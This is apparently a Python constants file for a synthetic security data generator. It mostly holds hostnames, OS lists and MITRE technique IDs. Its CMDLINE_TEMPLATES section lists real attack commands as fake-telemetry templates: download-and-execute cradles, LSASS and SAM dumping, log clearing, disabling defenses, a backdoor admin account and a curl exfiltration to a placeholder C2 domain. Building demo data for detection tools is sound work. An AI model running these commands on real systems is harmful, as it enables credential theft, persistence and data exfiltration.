"""
Shared constants for CyberDemo synthetic data generators.

This module contains all constant values used across the generator modules,
including MITRE techniques, cmdline templates, hostname prefixes, and anchor IDs.
"""

from typing import Dict, List, Tuple

# =============================================================================
# ANCHOR IDS - Fixed identifiers for test cases
# =============================================================================

ANCHOR_DETECTION_IDS: List[str] = [
    "DET-ANCHOR-001",
    "DET-ANCHOR-002",
    "DET-ANCHOR-003",
]

ANCHOR_INCIDENT_IDS: List[str] = [
    "INC-ANCHOR-001",
    "INC-ANCHOR-002",
    "INC-ANCHOR-003",
]

# Anchor file hashes that MUST be marked as malicious in threat intel
ANCHOR_HASHES: List[str] = [
    "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456",
    "b2c3d4e5f67890123456789012345678901abcdef2345678901abcdef234567",
    "c3d4e5f678901234567890123456789012abcdef3456789012abcdef3456789",
]

# =============================================================================
# HOSTNAME PREFIXES AND PATTERNS
# =============================================================================

HOSTNAME_PREFIXES: Dict[str, List[str]] = {
    "workstation": ["DESKTOP-", "WS-", "MAC-"],
    "server": ["SRV-", "DC-", "DB-"],
    "mobile": ["MOB-", "IPHONE-"],
    "other": ["VDI-", "IOT-"],
}

# Distribution weights (must sum to 100)
ASSET_TYPE_DISTRIBUTION: Dict[str, int] = {
    "workstation": 70,
    "server": 20,
    "mobile": 8,
    "other": 2,
}

# =============================================================================
# OPERATING SYSTEMS
# =============================================================================

OS_BY_TYPE: Dict[str, List[Tuple[str, List[str]]]] = {
    "workstation": [
        ("Windows 10", ["21H2", "22H2", "23H2"]),
        ("Windows 11", ["22H2", "23H2", "24H2"]),
        ("macOS", ["Sonoma 14.0", "Sonoma 14.1", "Ventura 13.6"]),
    ],
    "server": [
        ("Windows Server 2019", ["1809", "1903"]),
        ("Windows Server 2022", ["21H2", "23H2"]),
        ("Ubuntu Server", ["20.04 LTS", "22.04 LTS", "24.04 LTS"]),
        ("RHEL", ["8.9", "9.3"]),
    ],
    "mobile": [
        ("iOS", ["17.0", "17.1", "17.2", "17.3"]),
        ("Android", ["13", "14"]),
    ],
    "other": [
        ("Windows 10 IoT", ["LTSC 2021"]),
        ("Linux Embedded", ["5.15", "6.1"]),
    ],
}

# =============================================================================
# DEPARTMENTS AND SITES
# =============================================================================

DEPARTMENTS: List[str] = [
    "Engineering",
    "Finance",
    "HR",
    "IT",
    "Legal",
    "Marketing",
    "Operations",
    "Sales",
    "Security",
    "Executive",
    "R&D",
    "Customer Support",
]

SITES: List[str] = [
    "HQ-NYC",
    "DC-EAST",
    "DC-WEST",
    "OFFICE-LON",
    "OFFICE-TKY",
    "OFFICE-SYD",
    "REMOTE",
    "CLOUD-AWS",
    "CLOUD-AZR",
]

NETWORKS: List[str] = [
    "CORP",
    "DMZ",
    "PROD",
    "DEV",
    "GUEST",
    "IOT",
    "MGMT",
]

# =============================================================================
# CRITICALITY LEVELS
# =============================================================================

CRITICALITY_LEVELS: List[str] = ["low", "medium", "high", "critical"]

# Distribution weights for criticality
CRITICALITY_WEIGHTS: Dict[str, int] = {
    "low": 30,
    "medium": 40,
    "high": 20,
    "critical": 10,
}

# Server types skew toward higher criticality
CRITICALITY_WEIGHTS_SERVER: Dict[str, int] = {
    "low": 10,
    "medium": 25,
    "high": 35,
    "critical": 30,
}

# =============================================================================
# TAGS
# =============================================================================

ASSET_TAGS: List[str] = [
    "vip",
    "executive",
    "server",
    "domain-controller",
    "pci",
    "hipaa",
    "sox",
    "internet-facing",
    "legacy",
    "critical-infrastructure",
]

# =============================================================================
# MITRE ATT&CK TECHNIQUES
# =============================================================================

MITRE_TECHNIQUES: Dict[str, Dict[str, str]] = {
    # Execution
    "T1059.001": {"tactic": "Execution", "description": "PowerShell"},
    "T1059.003": {"tactic": "Execution", "description": "Windows Command Shell"},
    "T1059.005": {"tactic": "Execution", "description": "Visual Basic"},
    "T1059.007": {"tactic": "Execution", "description": "JavaScript"},
    "T1204.001": {"tactic": "Execution", "description": "Malicious Link"},
    "T1204.002": {"tactic": "Execution", "description": "Malicious File"},
    # Persistence
    "T1547.001": {"tactic": "Persistence", "description": "Registry Run Keys / Startup Folder"},
    "T1053.005": {"tactic": "Persistence", "description": "Scheduled Task"},
    "T1136.001": {"tactic": "Persistence", "description": "Local Account Creation"},
    # Privilege Escalation
    "T1548.002": {"tactic": "Privilege Escalation", "description": "Bypass User Account Control"},
    "T1134.001": {"tactic": "Privilege Escalation", "description": "Token Impersonation/Theft"},
    # Defense Evasion
    "T1070.001": {"tactic": "Defense Evasion", "description": "Clear Windows Event Logs"},
    "T1562.001": {"tactic": "Defense Evasion", "description": "Disable or Modify Tools"},
    "T1027": {"tactic": "Defense Evasion", "description": "Obfuscated Files or Information"},
    "T1218.011": {"tactic": "Defense Evasion", "description": "Rundll32"},
    # Credential Access
    "T1003.001": {"tactic": "Credential Access", "description": "LSASS Memory"},
    "T1003.002": {"tactic": "Credential Access", "description": "Security Account Manager"},
    "T1558.003": {"tactic": "Credential Access", "description": "Kerberoasting"},
    "T1552.001": {"tactic": "Credential Access", "description": "Credentials In Files"},
    # Discovery
    "T1087.001": {"tactic": "Discovery", "description": "Local Account Discovery"},
    "T1087.002": {"tactic": "Discovery", "description": "Domain Account Discovery"},
    "T1083": {"tactic": "Discovery", "description": "File and Directory Discovery"},
    "T1057": {"tactic": "Discovery", "description": "Process Discovery"},
    # Lateral Movement
    "T1021.001": {"tactic": "Lateral Movement", "description": "Remote Desktop Protocol"},
    "T1021.002": {"tactic": "Lateral Movement", "description": "SMB/Windows Admin Shares"},
    "T1021.006": {"tactic": "Lateral Movement", "description": "Windows Remote Management"},
    "T1570": {"tactic": "Lateral Movement", "description": "Lateral Tool Transfer"},
    # Collection
    "T1005": {"tactic": "Collection", "description": "Data from Local System"},
    "T1114.001": {"tactic": "Collection", "description": "Local Email Collection"},
    # Command and Control
    "T1071.001": {"tactic": "Command and Control", "description": "Web Protocols"},
    "T1071.004": {"tactic": "Command and Control", "description": "DNS"},
    "T1105": {"tactic": "Command and Control", "description": "Ingress Tool Transfer"},
    # Exfiltration
    "T1041": {"tactic": "Exfiltration", "description": "Exfiltration Over C2 Channel"},
    "T1567.002": {"tactic": "Exfiltration", "description": "Exfiltration to Cloud Storage"},
    # Impact
    "T1486": {"tactic": "Impact", "description": "Data Encrypted for Impact"},
    "T1490": {"tactic": "Impact", "description": "Inhibit System Recovery"},
}

# =============================================================================
# CMDLINE TEMPLATES - Realistic attack command lines
# =============================================================================

CMDLINE_TEMPLATES: Dict[str, List[str]] = {
    "powershell_encoded": [
        'powershell.exe -EncodedCommand {encoded_payload}',
        'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded_payload}',
        'powershell.exe -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'{url}\')"',
        'powershell.exe -nop -exec bypass -c "IEX ((New-Object System.Net.WebClient).DownloadString(\'{url}\'))"',
    ],
    "lateral_movement": [
        'wmic /node:"{target_host}" process call create "cmd.exe /c {command}"',
        'psexec.exe \\\\{target_host} -accepteula cmd.exe /c {command}',
        'Enter-PSSession -ComputerName {target_host} -Credential $cred',
        'Invoke-Command -ComputerName {target_host} -ScriptBlock {{ {command} }}',
        'net use \\\\{target_host}\\C$ /user:Administrator {password}',
        'schtasks /create /s {target_host} /tn "Update" /tr "{malware_path}" /sc once /st 00:00',
    ],
    "credential_theft": [
        'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
        'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} C:\\Temp\\lsass.dmp full',
        'procdump.exe -ma lsass.exe lsass.dmp',
        'reg save HKLM\\SAM C:\\Temp\\sam.save',
        'reg save HKLM\\SYSTEM C:\\Temp\\system.save',
        'ntdsutil.exe "ac in ntds" "ifm" "create full C:\\Temp" q q',
    ],
    "discovery": [
        'net user /domain',
        'net group "Domain Admins" /domain',
        'nltest /dclist:{domain}',
        'dsquery user -limit 0',
        'arp -a',
        'net view /domain',
        'whoami /all',
        'systeminfo',
        'ipconfig /all',
        'tasklist /v',
    ],
    "persistence": [
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /d "{malware_path}" /f',
        'schtasks /create /tn "SystemUpdate" /tr "{malware_path}" /sc onlogon /ru SYSTEM',
        'wmic useraccount where name="{user}" set PasswordExpires=FALSE',
        'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
    ],
    "defense_evasion": [
        'wevtutil cl Security',
        'wevtutil cl System',
        'wevtutil cl Application',
        'Stop-Service -Name "Sense" -Force',
        'Set-MpPreference -DisableRealtimeMonitoring $true',
        'netsh advfirewall set allprofiles state off',
        'bcdedit /set {{default}} recoveryenabled No',
    ],
    "data_exfil": [
        'curl -X POST -F "file=@{filepath}" https://{c2_domain}/upload',
        'Compress-Archive -Path C:\\Users\\* -DestinationPath C:\\Temp\\data.zip',
        '7z a -p{password} archive.7z {filepath}',
        'certutil -encode {filepath} encoded.txt',
    ],
}

# =============================================================================
# MALWARE FILE NAMES AND PATHS
# =============================================================================

MALICIOUS_FILENAMES: List[str] = [
    "svchost.exe",
    "csrss.exe",
    "lsass.exe",
    "winlogon.exe",
    "explorer.exe",
    "taskhost.exe",
    "conhost.exe",
    "dllhost.exe",
    "msiexec.exe",
    "setup.exe",
    "update.exe",
    "patch.exe",
    "installer.exe",
    "helper.exe",
    "service.exe",
]

MALICIOUS_PATHS: List[str] = [
    "C:\\Users\\{user}\\AppData\\Local\\Temp\\",
    "C:\\Users\\{user}\\AppData\\Roaming\\",
    "C:\\ProgramData\\",
    "C:\\Windows\\Temp\\",
    "C:\\Windows\\System32\\",
    "C:\\Users\\Public\\",
    "C:\\Temp\\",
]

# =============================================================================
# PROCESS TREE TEMPLATES
# =============================================================================

PROCESS_CHAINS: List[List[str]] = [
    ["explorer.exe", "cmd.exe", "powershell.exe"],
    ["explorer.exe", "outlook.exe", "winword.exe", "powershell.exe"],
    ["explorer.exe", "chrome.exe", "cmd.exe", "powershell.exe"],
    ["services.exe", "svchost.exe", "cmd.exe", "powershell.exe"],
    ["explorer.exe", "cmd.exe", "wmic.exe"],
    ["explorer.exe", "mshta.exe", "powershell.exe"],
    ["explorer.exe", "wscript.exe", "cmd.exe", "powershell.exe"],
    ["winlogon.exe", "userinit.exe", "explorer.exe", "cmd.exe"],
    ["services.exe", "wmiprvse.exe", "cmd.exe", "powershell.exe"],
    ["explorer.exe", "excel.exe", "cmd.exe", "certutil.exe"],
]

# =============================================================================
# THREAT INTEL LABELS
# =============================================================================

MALWARE_LABELS: List[str] = [
    "trojan",
    "ransomware",
    "apt",
    "backdoor",
    "downloader",
    "dropper",
    "infostealer",
    "keylogger",
    "rat",
    "rootkit",
    "cryptominer",
    "botnet",
    "exploit",
    "worm",
]

INTEL_SOURCES: List[str] = [
    "VirusTotal",
    "AlienVault OTX",
    "MISP",
    "Mandiant",
    "CrowdStrike",
    "Unit42",
    "Recorded Future",
    "ThreatConnect",
    "Internal SOC",
    "CISA",
    "FBI Flash",
    "MS-ISAC",
]

# =============================================================================
# CVE AND VULNERABILITY DATA
# =============================================================================

CVE_PREFIXES: List[str] = ["2024", "2023", "2022"]

VULNERABILITY_TITLES: List[str] = [
    "Remote Code Execution in {product}",
    "Privilege Escalation in {product}",
    "SQL Injection in {product}",
    "Cross-Site Scripting in {product}",
    "Authentication Bypass in {product}",
    "Buffer Overflow in {product}",
    "Path Traversal in {product}",
    "Denial of Service in {product}",
    "Information Disclosure in {product}",
    "Command Injection in {product}",
]

VULNERABLE_PRODUCTS: List[str] = [
    "Microsoft Exchange",
    "Apache Log4j",
    "VMware vCenter",
    "Citrix ADC",
    "Fortinet FortiOS",
    "Palo Alto PAN-OS",
    "SolarWinds Orion",
    "Atlassian Confluence",
    "Adobe Reader",
    "Google Chrome",
    "Microsoft Office",
    "OpenSSL",
    "Apache Struts",
    "WordPress",
    "Drupal",
]

# =============================================================================
# SEVERITY DISTRIBUTIONS
# =============================================================================

EDR_SEVERITY_DISTRIBUTION: Dict[str, int] = {
    "Critical": 15,
    "High": 25,
    "Medium": 35,
    "Low": 25,
}

CVE_SEVERITY_DISTRIBUTION: Dict[str, int] = {
    "Critical": 10,
    "High": 25,
    "Medium": 40,
    "Low": 25,
}

INCIDENT_SEVERITY_DISTRIBUTION: Dict[str, int] = {
    "Critical": 10,
    "High": 25,
    "Medium": 40,
    "Low": 25,
}

# =============================================================================
# SIEM INCIDENT TITLES
# =============================================================================

INCIDENT_TITLE_TEMPLATES: List[str] = [
    "Suspicious PowerShell Activity on {hostname}",
    "Potential Credential Theft Detected on {hostname}",
    "Lateral Movement Attempt from {hostname}",
    "Malware Execution Blocked on {hostname}",
    "Data Exfiltration Attempt from {hostname}",
    "Ransomware Activity Detected on {hostname}",
    "Unauthorized Access Attempt on {hostname}",
    "C2 Communication Detected from {hostname}",
    "Privilege Escalation on {hostname}",
    "Defense Evasion Technique on {hostname}",
    "Persistence Mechanism Created on {hostname}",
    "Discovery Activity on {hostname}",
]

INCIDENT_STATUS: List[str] = [
    "new",
    "investigating",
    "contained",
    "resolved",
    "false_positive",
]

INCIDENT_STATUS_WEIGHTS: Dict[str, int] = {
    "new": 15,
    "investigating": 30,
    "contained": 20,
    "resolved": 30,
    "false_positive": 5,
}

# =============================================================================
# USER NAMES FOR REALISTIC DATA
# =============================================================================

FIRST_NAMES: List[str] = [
    "John", "Jane", "Michael", "Sarah", "David", "Emily",
    "Robert", "Lisa", "William", "Jennifer", "James", "Amanda",
    "Christopher", "Jessica", "Daniel", "Ashley", "Matthew", "Nicole",
    "Andrew", "Stephanie", "Joshua", "Melissa", "Brian", "Michelle",
    "Kevin", "Elizabeth", "Richard", "Angela", "Thomas", "Rebecca",
]

LAST_NAMES: List[str] = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
    "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez",
    "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson",
    "Martin", "Lee", "Thompson", "White", "Harris", "Sanchez",
    "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young",
]

# =============================================================================
# EDR AGENT DATA
# =============================================================================

EDR_AGENT_VERSIONS: List[str] = [
    "7.15.0",
    "7.15.1",
    "7.14.2",
    "7.14.0",
    "7.13.5",
    "7.12.0",
]

CONTAINMENT_STATUS: List[str] = [
    "normal",
    "lift_pending",
    "contained",
    "isolation_pending",
]

# =============================================================================
# RISK COLORS
# =============================================================================

RISK_COLORS: List[str] = ["Green", "Yellow", "Red"]
